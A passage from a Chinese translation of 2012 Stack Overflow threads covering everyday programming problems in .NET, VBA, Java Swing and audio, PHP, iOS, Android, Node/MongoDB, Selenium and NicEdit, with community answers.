if(numItems == 4 && $(this).hasClass("selected")) {

    $(this).removeClass("selected"); 
}           

});​ 
```

[http://jsfiddle.net/NHnU5/1/](http://jsfiddle.net/NHnU5/1/)

# .net - 如何从数据库中检索多个查询结果

> ID：10991380
> 
> 赞同：0
> 
> 时间：2012-06-12T06:13:37.027
> 
> 标签：.net, database, asp.net-mvc-3, .net-4.0, ado.net

我正在处理我在 .net 4 和 MVC 3 上构建的项目之一，除了我对代码改进和特别是关于数据库连接的效率几乎没有疑问之外，情况都很好，情况是：

我在连接到数据库并从中检索信息的模型类中起作用，由于要求很少，必须使用多个查询来检索必须由函数返回的整体结果，所以为了实现这一点，我目前正在做正在创建三个 sql 命令并运行它们并从它们中一一填充数据集。

但是我有一种直觉，这可能不是最好的可用和有效的方法，而且这也可能会耗费时间/资源，对数据库逐个运行多个查询，这可能是多余的。

所以我想从你们那里得到专家意见，我做得对还是有更好更快的方法来实现这一点？

```
public string[] GetData()
    {
        …

        const string cmdString = "Select TOP 3 item.Id FROM design WHERE status=1 ORDER BY submittedOn Desc";
        const string cmdString2 = "Select TOP 6 item.Id FROM design WHERE status=1 ORDER BY orders desc;";
        const string cmdString3 = "SELECT TOP 9 item.Id FROM design WHERE status=1 ORDER BY NewID()";
        …

        var conn = new SqlConnection(conString.ConnectionString);
        var mySqlDataAdapter = new SqlDataAdapter();

        var myDataSet = new DataSet();
        int totalRows = 1;

        try
        {
            mySqlDataAdapter = new SqlDataAdapter(cmdString, conn);
            mySqlDataAdapter.Fill(myDataSet, "DataTble");

            mySqlDataAdapter = new SqlDataAdapter(cmdString2, conn);
            mySqlDataAdapter.Fill(myDataSet, "DataTble");

            mySqlDataAdapter = new SqlDataAdapter(cmdString3, conn);
            mySqlDataAdapter.Fill(myDataSet, "DataTble");

            totalRows = myDataSet.Tables["DataTble"].Rows.Count;

            status = true;
        }
        catch (Exception exp)
        {
            status = false;
            totalRows = 0;
        }

        var dataResults = new string[totalRows];

        if (status)
        {
            //putting the results into an Array() and returning that Array.
        }
        conn.Dispose();
        mySqlDataAdapter.Dispose();
        myDataSet.Dispose();
    return dataResults;
    } 
```

# excel - 来自vba userform datepicker的日期用于对excel表格进行排序错误格式

> ID：10991384
> 
> 赞同：0
> 
> 时间：2012-06-12T06:14:01.817
> 
> 标签：excel, excel-2007, userform, vba

从 datepicker 传递日期以对 excel 表进行排序时，格式在某处变得混乱并 `dd/mm/yyyy` 从 `mm/dd/yyyy`

我检查了我的区域设置，它们设置为`dd/mm/yyy`

```
Sub sortFuel()

With UserForm1
    With .dp_StartDate
        startDate = Format(.Value, "dd/mm/yyyy")
    End With
    With .dp_EndDate
        endDate = Format(.Value, "dd/mm/yyyy")
    End With
End With

MsgBox startDate
MsgBox endDate

With ws
    .ListObjects("Table_DFDBMain_FuelTrans4").Range.AutoFilter Field:= _
    3, Criteria1:=">=" & Format(startDate, "dd/mm/yyyy"), Operator:=xlAnd, Criteria2:="<=" & Format(endDate, "dd/mm/yyyy")
End With

End Sub 
```

我表中的列已经按 dd/mm/yyyy 排序，但是如果我选择 2012 年 5 月 7 日，它会在 2012 年 7 月 5 日出现。注意：它只会在日列小于 12 时翻转。例如，如果我选择6 月 24 日为开始日期，它将保持 6 月 24 日。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:40:13.283

试试这个

```
Sub sortFuel()
    Dim D1 As Long, D2 As Long

    With UserForm1
        With .dp_StartDate
            startDate = Format(.Value, "dd/mm/yyyy")
        End With
        With .dp_EndDate
            endDate = Format(.Value, "dd/mm/yyyy")
        End With
    End With

    D1 = Val(Format(startDate, "0"))
    D2 = Val(Format(endDate, "0"))

    With ws
        .ListObjects("Table_DFDBMain_FuelTrans4").Range.AutoFilter Field:= _
        3, Criteria1:=">=" & D1, Operator:=xlAnd, Criteria2:="<=" & D2
    End With
End Sub 
```

# ruby-on-rails - 在 VM ware 上运行的 ubuntu 12.04 上安装 netbeans 6.9.1 时出现此错误

> ID：10991386
> 
> 赞同：1
> 
> 时间：2012-06-12T06:14:48.323
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ubuntu, netbeans

在 VM ware 上运行的 ubuntu 12.04 上安装 netbeans 6.9.1 时出现此错误

```
sudo sh ./jdk-6u22-nb-6_9_1-linux-ml.sh 
[sudo] password for samkt: 
 Configuring the installer...
 Searching for JVM on the system...
   Preparing bundled JVM ...
./jdk-6u22-nb-6_9_1-linux-ml.sh: 1: eval: /tmp/.nbi-2064057.tmp/jre-6u20-linux-i586.bin: not found
Cannot extract bundled JVM 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:17:27.623

尝试安装最新的 JDK 并重新启动操作系统

再次尝试你的步骤

# sql - SQL Server & EF：如何有一个计算列

> ID：10991387
> 
> 赞同：1
> 
> 时间：2012-06-12T06:14:59.157
> 
> 标签：sql, sql-server, entity-framework, calculated-columns

我想要一个在每次更改（插入、修改）时更新的字段，基本上，它是一个“ModificationDate”。

我看到 EF 中有一个“计算的”StoreGeneratedPattern。但是由于这不会设置日期，而只会获取数据库生成的值，所以我需要知道我应该在数据库上做什么才能将这个默认值设置为相当于`GetDate()`每次修改/插入时的值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:58:41.473

您需要在获取数据并自己执行更新的位置创建`INSTEAD OF`更新[触发器](http://msdn.microsoft.com/en-us/library/ms189799%28v=sql.105%29.aspx)`AFTER UPDATE`，或者在执行另一个更新以设置日期的位置创建触发器。

`SaveChanges`在保存到数据库之前，在应用程序中覆盖和设置日期会更容易。

# ios - 从主机到 iPhone 应用程序的位置术语更新

> ID：10991388
> 
> 赞同：2
> 
> 时间：2012-06-12T06:15:11.403
> 
> 标签：ios, location, lingo

主机发送位置术语信息/更新。iOS/iPhone 应用程序如何处理此更新。

我的应用程序使用 CLLocationManager 使用 GPS 信息来处理位置。但是当主机发送位置术语时，读取这些更新的方法是什么。

谷歌搜索了很多，但运气不佳:(

谢谢！

# javascript - Firefox Addon 上的 JSONP 访问中的“（回调方法）未定义”

> ID：10991390
> 
> 赞同：5
> 
> 时间：2012-06-12T06:15:37.440
> 
> 标签：javascript, jquery, firefox-addon, firefox-addon-sdk

我正在尝试使用带有 jQ​​uery 的 ajax 方法的 JSONP 从服务器获取数据。

```
$.ajax({
    dataType: "jsonp",
    url: "https://secure.flickr.com/services/feeds/photos_public.gne?tags=cat&tagmode=any&format=json",
    type: "GET",
    data: "msg=aaa",
    cache: true,
    jsonp: "jsoncallback",
    // jsonpCallback: "callbackmethod",

    success: function(encryptedMsg){
        console.log("Encryption success!");
    },
    error: function(req, errmsg, thrownError) {
        console.log("Error: HTTP " + req.status + " " + errmsg);
    }
}); 
```

但是，错误控制台中显示以下错误：

```
Error: jQuery1720502636097747291_1339479763752 is not defined
Source File: https://secure.flickr.com/services/feeds/photos_public.gne?tags=cat&tagmode=any&format=json&jsoncallback=jQuery1720502636097747291_1339479763752&msg=aaa
Line: 1 
```

如果打开源文件 URL，可以看到下面的 JSON，而且看起来是正确的 JSON。

```
jQuery1720502636097747291_1339479763752({
    "title": "Recent Uploads tagged cat",
    // ...
    "items": [
    {
        "title": "Chaton",
        // ...
    },
    // ...
    ]
}) 
```

我还尝试使用 jsonpCallback:"callbackmethod" 指定方法名称，但它不起作用。我还使用了 $.getJson() 方法和 jquery-jsonp (http://code.google.com/p/jquery-jsonp/) 但结果是一样的。

浏览器是 Firefox 并使用 HTML4。这用于 Firefox 插件。

您可以在此处阅读完整代码：[https](https://builder.addons.mozilla.org/addon/1048275/revision/749)
://builder.addons.mozilla.org/addon/1048275/revision/749 我在 common-content.js 的 getEncryptedMessage 函数中使用 $.ajax

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:30:36.663

不要在 Firefox 扩展中使用 JSONP。如果它有效，那将是一个安全问题，因为它允许某些 Web 服务器在您的扩展程序的上下文中运行代码。但是，在您的情况下，它不起作用，因为[内容脚本不直接访问网页](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/dev-guide/guides/content-scripts/accessing-the-dom.html)。JSONP 脚本在网页上下文中运行，并且看不到内容脚本定义的函数。

您应该使用该[`request`模块](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/request.html)向任何 Web 服务器发出请求，它支持 JSON 格式。您当然不能从内容脚本中使用它，但您可以将消息发送回扩展程序，然后扩展程序应该发出请求并将服务器响应发送回内容脚本。请参阅有关[与内容脚本通信的](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/dev-guide/guides/content-scripts/using-port.html)文档。

# java - 将音频字节 [] 保存到 wav 文件

> ID：10991391
> 
> 赞同：10
> 
> 时间：2012-06-12T06:15:38.247
> 
> 标签：java, audio

在过去的几天里，试图让它发挥作用时遇到了一些麻烦。但我想要的是我们有一个通过网络发送原始数据的应用程序。然后我读入这个二进制数据并想把它保存到一个 wav（任何音频）文件中。以后可能会看压缩。

所以有问题的代码：

```
byte[] allBytes = ...
InputStream b_in = new ByteArrayInputStream(allBytes);

try
{
     AudioFormat format = new AudioFormat(8000f, 16, 1, true, true);
     AudioInputStream stream = new AudioInputStream(b_in, format, allBytes.length);
     //AudioInputStream stream = AudioSystem.getAudioInputStream(b_in); 
```

也尝试过使用上述语句，但我得到了例外：`javax.sound.sampled.UnsupportedAudioFileException: could not get audio input stream from stream`. 所以我认为正在发生的是，因为我的流是原始音频数据并且没有波头，这会引发异常？

```
File newPath = new File(SystemConfiguration.getLatest().voiceNetworkPathDirectory + currentPhoneCall.fileName);
if (!AudioSystem.isFileTypeSupported(Type.WAVE, stream))
{
    Logger.error("Audio System file type not supported");
}

AudioSystem.write(stream, Type.WAVE, newPath); 
```

该文件确实成功写入，但它都是静态的，我是否需要使用类似[这样](https://ccrma.stanford.edu/courses/422/projects/WaveFormat/)的东西在输出上创建一个波头。当我在记事本中查看输出的 wav 文件时，它似乎确实有一个标题，因为它以“RIFF”开头。

我需要在我的输入流中添加一个假标题吗？我应该只创建自己的输出标头并使用二进制编写器保存它吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-14T00:00:30.053

所以我最终让它工作了，不太确定为什么，但这是工作的代码：

```
InputStream b_in = new ByteArrayInputStream(resultArray);
try {
        DataOutputStream dos = new DataOutputStream(new FileOutputStream(
                "C:\\filename.bin"));
        dos.write(resultArray);
        AudioFormat format = new AudioFormat(8000f, 16, 1, true, false);
        AudioInputStream stream = new AudioInputStream(b_in, format,
                resultArray.length);
        File file = new File("C:\\file.wav");
        AudioSystem.write(stream, Type.WAVE, file);
        Logger.info("File saved: " + file.getName() + ", bytes: "
                + resultArray.length) 
```

所以它一定是我的签名/未签名/小端设置。我最终做的是将数据保存到二进制文件中。然后将该文件作为原始数据导入。这告诉了我一切，除了我已经新的利率。我现在唯一的问题是与标题计算有关。我保存生成 4 秒 wav 的二进制数据，但它只有 2 秒的声音。好像它在计算我的标题错误。我不确定这是否与柳岩提到的帧长有关。

如果我的数组长度为 160。这是否意味着我的帧长度为 10？160 / 1 / 16。如果我这样做，那么我只会将 10 个字节的数据存储到我的二进制文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T15:05:55.557

从您的描述中很难知道错误在哪里，但要回答您的问题，当您打开文件时看到“RIFF”确实意味着它有一个标题。尝试构建自己的标题是可能的，但有点费时（而且没有必要，因为你有一个）。

现在，在阅读时，从文件本身获取格式是最安全的，而不是尝试手动指定它——这样更不容易出错。这里有示例代码：

[http://www.jsresources.org/examples/SimpleAudioPlayer.java.html](http://www.jsresources.org/examples/SimpleAudioPlayer.java.html)

写的时候，你说“文件确实写成功了，但它都是静态的”——你用你自己的java代码以外的东西确认了吗？也许我理解不正确，但听起来您正在尝试使用新的 Java 代码录制和播放 WAV 文件，如果是这种情况，很难判断录制或播放是否有问题。

您应该从原始格式（16 位，立体声，未压缩，44,100 kHz）开始，以便您可以在媒体播放器或 quicktime 或其他工具中打开文件并验证录制是否有效。一旦成功，您可以尝试更改 SR 等等。这是一些用于录制的示例代码。从那开始，验证它是否有效，然后继续进行更复杂的事情：

[http://www.jsresources.org/examples/SimpleAudioRecorder.java.html](http://www.jsresources.org/examples/SimpleAudioRecorder.java.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-08T04:13:41.773

尝试设置 AudioFormat 的 Encoding 和 frame size 和 frame rate。

```
new AudioFormat(AudioFormat.Encoding.PCM_SIGNED,
                  8000f,
                  16,
                  1,
                  2, // frameSize
                  8000f,// frameRate
                  false); 
```

# php - 使用正则表达式或 HTML 解析器在 php 中查找所有以 pdf 文件为源的锚标记

> ID：10991395
> 
> 赞同：0
> 
> 时间：2012-06-12T06:16:04.920
> 
> 标签：php, regex, anchor, html-parser

我怎样才能找到所有`anchor`带有源pdf的标签

```
$string="hello this is a dummy text <a href="../../abc.pdf"> 
```

我只需要`abc.pdf`在字符串变量中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:07:39.120

您应该使用[DOMDocument](http://php.net/domdocument)而不是正则表达式：

```
$string='hello this is a dummy text <a href="../../abc.pdf">'; 
$doc = new DOMDocument;
$doc->loadHTML($string);

$href = $doc->getElementsByTagName('a')->item(0)->getAttribute('href');
echo basename($href); // abc.pdf 
```

# selenium - 如何停止 Firefox 驱动程序以触发不必要的鼠标悬停事件

> ID：10991400
> 
> 赞同：0
> 
> 时间：2012-06-12T06:16:41.893
> 
> 标签：selenium, webdriver, selenium-firefoxdriver

我正在使用 Webdriver 2.21 和 Firefox 11。

我有菜单栏，它在鼠标悬停事件时填充下拉菜单。当我在我的 webdriver 测试用例中触发点击事件时（如 driver.findElement(elementToClick)).click(); 它在单击之前隐式地在菜单栏上触发大量鼠标悬停事件。当填充的下拉菜单出现在 elementToClicked 前面时，有时会出现问题，因为它单击了要单击的元素前面的 menuitem。任何帮助，将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:02:22.257

就像是：

```
Actions actions = new Actions(driver);
Action hover = actions.moveToElement(myWebElement).build();
hover.perform(); 
```

仅悬停 WebElement myWebElement

# iphone - 返回的 NSString 变量的内存管理

> ID：10991402
> 
> 赞同：1
> 
> 时间：2012-06-12T06:16:51.743
> 
> 标签：iphone, memory, nsstring

我为我的 AppDelegate 设置了一个变量，它存储在 UIWebView 中单击的当前 URL。该变量在 shouldStartLoadWithRequest 函数中设置，如下：

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {

    NSString *val = [request.URL absoluteString];

    currentURL = val;
    return YES;
} 
```

问题是稍后在应用程序中，访问 currentURL 会导致 EXC_BAD_ACCESS 错误，因为 NSString 已被销毁。但是，如果我在分配变量时添加“保留”，例如：

```
NSString *val = [[request.URL absoluteString] retain]; 
```

那么这意味着每次查看页面时，都会保留一个永远不会释放的新字符串，从而导致内存泄漏。我以后如何释放所有这些保留的字符串？

我正在存储此值，以便在加载页面出现问题时重新加载页面。

```
- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error {
    [ausWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:currentURL]]]
} 
```

我敢打赌这很简单。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:24:30.320

假设 currentURL 保留属性，您应该这样做：

```
NSString *val = [request.URL absoluteString];
[currentURL release];
currentURL = [val retain]; 
```

在你的交易中

```
[currentURL release]; 
```

或者当你合成你保留的属性时，你只需要在你的 shouldStartLoadWithRequest 中做（当然仍然需要释放）：

```
self.currentURL = [request.URL absoluteString]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:24:49.430

```
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType 
{

        NSString *val = [request.URL absoluteString];
        if(currentURL)
        {
            [currentURL release];
            currentURL = nil;
        }
        currentURL = [[NSString alloc] initWithString:val];
        return YES;
} 
```

# node.js - NodeJS + Node-MongoDB-native：按字母顺序对对象进行排序

> ID：10991403
> 
> 赞同：1
> 
> 时间：2012-06-12T06:16:55.877
> 
> 标签：node.js, mongodb, sorting

我正在尝试按字母顺序按“名称”参数对集合中的对象进行排序。这是我正在使用的代码：

```
app.get('/companies', loadUser, function(req,res){
    db.collection("companies",function(err,collection){
            collection.find({}, { sort:[['name',-1]]},function(err, companies) {
                var companies_list = new Array();
                companies.each(function(err, company){
            ... 
            });
    })
}); 
```

我实际上不明白排序参数是如何工作的，什么是-1。[官方文档](https://github.com/christkv/node-mongodb-native/blob/master/docs/queries.md)对我没有帮助。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-16T13:37:48.287

你的代码看起来不错。我宁愿用

```
{ sort: [['name': 'desc']] } 
```

因为它更明确。两种方法都有效。

省略排序方向时：

```
{ sort: 'name'} 
```

它按升序排列。

# java - 不从蓝牙健康设备读取数据（适用于 Android 2.2 及更高版本）

> ID：10991407
> 
> 赞同：0
> 
> 时间：2012-06-12T06:17:31.410
> 
> 标签：java, android, bluetooth, buffer, inputstream

我正在尝试从“蓝牙健康设备”（例如血氧计、温度计、称重机等）捕获 Android 手机上的（数据）读数。我可以将设备连接到手机，但是当它读取数据时它卡住了只在那边。我正在执行以下步骤..（Android 2.2）首先我正在创建套接字连接

1.  `BluetoothSocket Socket.connect();// for socket connection-----done successfully`

2.  `BluetoothSocket tmp= device.createRfcommSocketToServiceRecord(MY_UUID);`//这里 MY_UUID="00001101-0000-1000-8000-00805F9B34FB";

3.  在阅读线程中

    `byte[] buffer = new byte[37];// i think here I am not getting exact bytes`

    `int bufferBytes = 0, bufferIndex = 0;`

    ```
     Log.e(TAG, "MESSAGE_READ....");
        Communications comms = null;
        Bundle bundle = new Bundle();
        try {
             comms = new Communications();
             Log.e(TAG, "After Communications....");

        } catch (Exception e) {
            Log.e(TAG, "Error in communicaton....");
        }

        // Keep listening to the InputStream while connected
        while (true) {

            Log.e(TAG, "Its coming in while");
            try {

                try {
                    bufferBytes = mmInStream.read(buffer);// the code stuck here its not going down till health device get off(its directly jump to exception after device get off)
                } catch (IndexOutOfBoundsException e) {
                    Log.e(TAG, "bufferBytes error ====== +e.getMessage());
                }

                //Log.e(TAG, "bufferBytes====== "+bufferBytes);
                while (bufferBytes > bufferIndex) {

                    String[] message = comms.receiveMessage(buffer,
                            bufferIndex, bufferBytes);
                    bufferIndex = Integer.parseInt(message[1]);
                    Log.e(TAG, "bufferIndex====== "+bufferIndex);
                    if (message[0] != null) {

                        /*
                         * Processing message sent by device
                         */
                        StringTokenizer dataInTokens = new StringTokenizer(
                                message[0]);

                        if (dataInTokens.hasMoreTokens() == true) {

                            String token = dataInTokens.nextToken();
                            Log.e(TAG, "token====== "+token);
                            if (token.equals("a")) {

                                int weight = 0;
                                if (dataInTokens.hasMoreTokens() == true) {

                                    weight = Integer.parseInt(dataInTokens
                                            .nextToken());

                                    // Send a message back to the Activity
                                    msg = mHandler
                                            .obtainMessage(ScaleActivity.MESSAGE_READ);
                                    bundle.putInt(ScaleActivity.WEIGHT,
                                            weight);
                                    msg.setData(bundle);
                                    mHandler.sendMessage(msg);
                                }
                            } else if (token.equals("b")) {

                                int weight = 0;
                                if (dataInTokens.hasMoreTokens() == true) {

                                    weight = Integer.parseInt(dataInTokens
                                            .nextToken());

                                    // Send a message back to the Activity
                                    msg = mHandler
                                            .obtainMessage(ScaleActivity.MESSAGE_READ);
                                    bundle.putInt(
                                            ScaleActivity.WEIGHT_TO_SAVE,
                                            weight);
                                    msg.setData(bundle);
                                    mHandler.sendMessage(msg);
                                }
                            }
                        }
                    }
                } 
    ```

我还尝试了 Android 4.0 HDP 示例。它可以[在此处](http://developer.android.com/resources/samples/BluetoothHDP/index.html)获得， 但我们的健康设备不兼容 hdp。所以它也不适合我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T13:12:15.723

我的情况完全一样。我能够使用 SSP 配置文件（UUID 00001101-0000-1000-8000-00805F9B34FB）建立连接并创建套接字。我已经通过执行此反射代码验证了蓝牙健康设备正在公开 SSP 服务（检索设备公开 UUID 的方法隐藏在此 API 级别中）：

```
Class<?> cl = Class.forName("android.bluetooth.BluetoothDevice");
Method method = cl.getMethod("getUuids");
Object retval = method.invoke(myBTDevice); 
```

*（retval 包含一组您可以连接的有效 UUID 设备服务。）*

我认为问题在于，在尝试读取任何内容之前，必须将一组命令发送到设备，否则读取方法将永远挂起。我已经在谷歌上搜索了几天，试图找出这个隐藏的协议，但没有成功。我也按制造商名称和型号搜索，但没有搜索（DigiFox 指尖脉搏血氧仪）。

我唯一的希望是，该设备提供了一个在 Windows 中运行的自定义软件，该软件可以与设备成功通信并能够读取测量值。在读取任何内容之前，我可能需要使用某种蓝牙分析仪或数据包嗅探器来检查发送到设备的数据。如果我能够让它工作，我会在这里发布。

问候。

# php - 想要创建用户的 facebook 应用程序保存 ID、全名、电子邮件地址吗？

> ID：10991408
> 
> 赞同：-2
> 
> 时间：2012-06-12T06:17:44.210
> 
> 标签：php, facebook, facebook-graph-api

我想创建一个 facebook 应用程序来保存用户的全名、id、电子邮件地址。我试过了，但没有任何事情发生，请问我该怎么办？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:45:47.643

如果您请求访问访问者的“电子邮件”，您可以获得他们的详细信息。你可以使用javascript FB api来实现它...

# java - JMenuBar 不显示

> ID：10991414
> 
> 赞同：4
> 
> 时间：2012-06-12T06:18:25.123
> 
> 标签：java, swing, jmenu, jmenuitem, jmenubar

我似乎做的一切都是正确的。我只需要实现一个简单的`JMenuBar`但它似乎不起作用。有人可以帮我解决这个问题吗？

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;

public class swing {
   public static void main (String[] args) {
      JFrame frame = new JFrame ("menu");
      frame.setVisible (true);
      frame.setSize (400, 400);
      frame.setDefaultCloseOperation (JFrame.EXIT_ON_CLOSE);
      JMenuBar bar = new JMenuBar ();
      frame.setJMenuBar (bar);
      bar.setVisible (true);
      JMenu file = new JMenu ("File");
      bar.add (file);
      JMenuItem open = new JMenuItem ("open");
      file.add(open);
   }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T06:23:49.940

您正在做的是首先显示框架，然后向其中添加菜单栏。不起作用。你应该做反向。`frame.setVisible (true);`在最后或至少在设置菜单栏之后换行。您应该始终在添加所有组件后显示框架，否则在显示框架后添加的组件在`repaint()`完成之前不会出现。

* * *

来自[@sjr](https://stackoverflow.com/users/373653/sjr)的评论：

> 有时`revalidate`需要（不仅`repaint`）在容器显示后更改容器（添加/删除/调整组件大小）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T06:44:47.813

试试这个，它有效。

将组件添加到框架中发生在其`invisible state`中，一旦设置了所有组件，然后使其可见。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;

public class swing extends JFrame {
   public swing(){
      this.setSize(400,400);
      this.setDefaultCloseOperation (JFrame.EXIT_ON_CLOSE);
      this.setComponent();
   }

   public void setComponent(){
      JMenuBar bar = new JMenuBar();
      JMenu menu = new JMenu("Menu");
      this.setJMenuBar(bar);
      bar.add(menu);
   }

   public static void main (String[] args) {
      EventQueue.invokeLater(new Runnable(){
         public void run(){
            swing s = new swing();
            s.setVisible(true);
         }
      });
   }
} 
```

# android - 如何关闭整个应用程序？

> ID：10991421
> 
> 赞同：0
> 
> 时间：2012-06-12T06:18:58.363
> 
> 标签：android, android-intent

我是android的初学者。当我单击按钮**KILL 选定应用程序**以关闭或终止特定（运行）应用程序或选定应用程序时。我知道这是可能的。但是如何解决它。我的示例 UI 是
[http://answers.oreilly.com/index.php?app=core&module=attach§ion=attach&attach_rel_module=post&attach_id=555](http://answers.oreilly.com/index.php?app=core&module=attach&section=attach&attach_rel_module=post&attach_id=555)
我尝试使用一些代码。但是所有的代码都只能用于关闭活动。未关闭的应用程序。我可以尝试参考一些stackoverflow答案。但我什么都不清楚。我的代码是

```
finish();
System.exit(0);
Intent i = new Intent();
i.setAction(Intent.ACTION_MAIN);
i.addCategory(Intent.CATEGORY_HOME);
startActivity(i);
android.os.Process.killProcess(android.os.Process.myPid()); 
```

请回复您的答案和意见对我很有价值。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:23:41.387

*我知道这是可能的。*

虽然不是你的意愿。

```
android.os.Process.killProcess(android.os.Process.myPid()); 
```

[文档](http://developer.android.com/reference/android/os/Process.html#killProcess%28int%29)中有关此方法的注释：

*请注意，尽管此 API 允许我们根据其 PID 请求终止任何进程，**但内核仍会对您实际能够终止的 PID 施加标准限制**。通常这意味着仅运行调用者的包/应用程序的进程以及该应用程序创建的任何其他进程；共享一个公共 UID 的包也将能够杀死彼此的进程。*

关于`system.exit(0)`，阅读[这个](https://stackoverflow.com/a/2043302/828625)答案。记住这一点。

关于`finish()`，[文档](http://developer.android.com/reference/android/app/Activity.html#finish%28%29)清楚地说明了以下内容：

"*当您的活动完成并应该关闭时调用它。* "

总而言之——不要试图成为任务杀手。android 操作系统很好地处理了这一点。不要插手。

*轮子已经被发明出来并且正在被完美地使用，不要重新发明它。*

请阅读[此](http://www.technicallyfunny.net/2012/01/android-task-killers.html)。您需要了解**Android 不需要任务杀手**。谷歌它，你会发现很多这样的文章。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:34:27.477

使用重启应用程序而不是 killProcess

```
ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
am.restartPackage("YOUR_PACKAGE_NAME"); 
```

restartPackage 是 killProcess 方法的包装。

使用以下权限来使用 restartPackage 方法

```
<uses-permission android:name="android.permission.RESTART_PACKAGES" /> 
```

# javascript - 如何使 Nicedit 只影响页面上的一个文本区域，而不是页面上的每个文本区域

> ID：10991426
> 
> 赞同：2
> 
> 时间：2012-06-12T06:19:20.197
> 
> 标签：javascript, textarea, nicedit

我一直在尝试在我的网站（我用来提交短篇小说）的表单上使用 nicedit (http://nicedit.com/)。该表单包括几个 textareas ()。其中之一是短篇小说的内容，我想在上面使用nicedit。另一个文本区域用于标记，我不想在其上使用 nicedit。但是，nicedit 对两者都适用。

这是我用来调用nicedit代码的javascript代码

```
<script type="text/javascript" src="core/rte.js"></script> <script type="text/javascript">
//<![CDATA[
bkLib.onDomLoaded(function() { nicEditors.allTextAreas() });
//]]> 
```

我签入了 nicEdit.js 和 allTextAreas() 对应于：

```
allTextAreas : function(nicOptions) {
var textareas = document.getElementsByTagName("textarea");
for(var i=0;i<textareas.length;i++) {
nicEditors.editors.push(new nicEditor(nicOptions).panelInstance(textareas[i]));
}
return nicEditors.editors;
}, 
```

我还在 ingetnet 上进行了调查，但找不到关于如何使 nicedit 代码仅影响一个文本区域的答案。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-12T07:19:01.583

通过查看您发布的代码，这应该可以工作：

```
<script type="text/javascript" src="core/rte.js"></script>
<script type="text/javascript">
//<![CDATA[
bkLib.onDomLoaded(function() {
    nicEditors.editors.push(
        new nicEditor().panelInstance(
            document.getElementById('myNicEditor')
        )
    );
});
//]]>
</script> 
```

只需给您的 textarea 任何您使用的 id：

```
<textarea id="myNicEditor"></textarea> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-11-05T13:58:25.477

对于任何希望通过类名使用多个 textarea 来执行此操作的人，我正在使用[Nathan Wall 的示例](https://stackoverflow.com/a/10992060/1500195)，并进行了一些更改：

```
<script type="text/javascript">
  //<![CDATA[
  bkLib.onDomLoaded(function() {
    elementArray = document.getElementsByClassName("nice-edit");
    for (var i = 0; i < elementArray.length; ++i) {
      nicEditors.editors.push(
        new nicEditor().panelInstance(
          elementArray[i]
        )
      );
    }
  });
  //]]>
</script> 
```

在类名中使用任意数量的文本区域`nice-edit`：

```
<textarea class="nice-edit"></textarea> 
```

在 Rails 中，我使用 CoffeeScript，这是我修改后的代码：

```
$ ->
  #<![CDATA[
  elementArray = document.getElementsByClassName("nice-edit")
  i = 0
  while i < elementArray.length
    nicEditors.editors.push new nicEditor(fullPanel: true).panelInstance(elementArray[i])
    ++i
  #]]> 
```

您会注意到我完全删除了该`bkLib.onDomLoaded`行，只是调用了文档函数的等效项 do `$ ->`。原因是由于**turbolinks**`bkLib.onDomLoaded`最初无法加载。它仅适用于刷新。这就是为什么我把它删除了。

 *** * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-01T17:23:46.097

我使用原始函数作为起点，通过标记名为所有文本区域制作了它

```
<script type="text/javascript">

bkLib.onDomLoaded(function () {

    var textareas = document.getElementsByTagName("textarea");

    for(var i=0;i<textareas.length;i++)
     {
        var myNicEditor = new nicEditor();
        myNicEditor.panelInstance(textareas[i]);

     }
}); 
```**

# javascript - 学习web socket的参考

> ID：10991427
> 
> 赞同：9
> 
> 时间：2012-06-12T06:19:27.610
> 
> 标签：javascript, jquery, ruby, sockets, websocket

我想用javascript编写一个web socket客户端，用ruby编写一个web socket服务器。

我该从哪里开始？是否有任何现有的图书馆可以减少我的工作？

我迷路了，很困惑谷歌搜索。请提供任何从哪里开始的链接，因为他们对 ruby​​、javascript、ruby 中的基本网络有了解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T09:20:28.077

我目前使用[em-websocket](https://github.com/igrigorik/em-websocket)

```
EventMachine.run {

    EventMachine::WebSocket.start(:host => "0.0.0.0", :port => 8080) do |ws|
